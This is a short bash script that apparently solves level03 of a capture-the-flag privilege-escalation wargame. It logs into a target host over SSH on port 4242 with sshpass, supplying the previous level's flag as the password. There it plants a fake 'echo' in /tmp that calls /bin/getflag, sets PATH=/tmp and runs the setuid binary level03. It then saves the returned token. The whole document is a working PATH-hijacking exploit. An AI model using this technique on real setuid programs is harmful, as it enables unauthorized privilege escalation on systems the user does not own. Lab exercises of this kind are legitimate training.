#!/usr/bin/env bash

if [ "$(dirname "$0")" == "." ]; then
	ROOT_DIR=$(dirname $(dirname $PWD))
else
	ROOT_DIR=$(dirname $(dirname $(dirname "$0")))
fi

SCRIPT="echo \"/bin/getflag\" > /tmp/echo; chmod +x /tmp/echo; export PATH=/tmp;./level03"

if [ ! -z "$1" ];then
	if [ ! -f "/tmp/level02.pcap" ]; then
		flag=$(sshpass -p $(cat $ROOT_DIR/level02/flag) ssh level03@$1 -p 4242 $SCRIPT | awk '{print $NF}')
	fi
	echo 'password:'
	echo $flag
	echo $flag > flag03.pwd
else
	echo "Usage: ./flag03.sh <ip address>"
fi
